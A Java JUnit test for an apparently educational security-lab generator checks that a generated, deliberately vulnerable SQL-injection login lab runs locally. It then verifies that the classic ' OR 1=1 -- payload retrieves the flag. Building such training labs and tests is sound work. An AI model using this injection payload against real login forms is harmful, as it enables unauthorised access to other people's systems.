package com.sechub.service;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.sechub.dto.GeneratedLabSpec;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.net.ServerSocket;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

class LabArtifactServiceTest {

    @TempDir
    Path tempDir;

    @Test
    void generatedSqlInjectionLabCanBeExploited() throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        LabArtifactService service = new LabArtifactService(mapper, tempDir.toString());
        String flag = "SecHub{integration_test_flag}";
        GeneratedLabSpec spec = new GeneratedLabSpec(
                "SQLi Test Lab", "Intentionally vulnerable login", "Find the admin flag",
                List.of("Inspect login", "Try a boolean condition", "Submit the flag"), 20, 100);

        LabArtifactService.LabArtifact artifact = service.create("sql-injection", flag, spec, "en");
        assertThat(artifact.directory().resolve("Dockerfile")).isRegularFile();
        assertThat(artifact.directory().resolve("app.py")).isRegularFile();
        JsonNode manifest = mapper.readTree(Files.readString(artifact.directory().resolve("manifest.json")));
        assertThat(manifest.path("flag").asText()).isEqualTo(flag);
        String parameter = manifest.path("variant").path("parameter").asText();
        assertThat(parameter).startsWith("ref_");

        int port;
        try (ServerSocket socket = new ServerSocket(0)) {
            port = socket.getLocalPort();
        }
        ProcessBuilder builder = new ProcessBuilder("python", "app.py")
                .directory(artifact.directory().toFile())
                .redirectErrorStream(true)
                .redirectOutput(ProcessBuilder.Redirect.DISCARD);
        builder.environment().put("PORT", Integer.toString(port));
        Process process = builder.start();
        try {
            waitUntilHealthy(port);

            String payload = URLEncoder.encode(parameter, StandardCharsets.UTF_8) + "="
                    + URLEncoder.encode("' OR 1=1 --", StandardCharsets.UTF_8)
                    + "&password=x";
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("http://127.0.0.1:" + port + "/login"))
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .POST(HttpRequest.BodyPublishers.ofString(payload))
                    .build();
            HttpResponse<String> response = HttpClient.newHttpClient().send(request,
                    HttpResponse.BodyHandlers.ofString());
            assertThat(response.statusCode()).isEqualTo(200);
            assertThat(response.body()).contains(flag);
        } finally {
            process.destroyForcibly();
        }
    }

    private void waitUntilHealthy(int port) throws Exception {
        HttpClient client = HttpClient.newBuilder().connectTimeout(Duration.ofMillis(250)).build();
        Exception lastError = null;
        for (int i = 0; i < 30; i++) {
            try {
                HttpResponse<String> response = client.send(HttpRequest.newBuilder()
                                .uri(URI.create("http://127.0.0.1:" + port + "/health"))
                                .timeout(Duration.ofMillis(500)).GET().build(),
                        HttpResponse.BodyHandlers.ofString());
                if (response.statusCode() == 200) return;
            } catch (Exception e) {
                lastError = e;
            }
            Thread.sleep(100);
        }
        throw new AssertionError("Generated lab did not become healthy", lastError);
    }
}
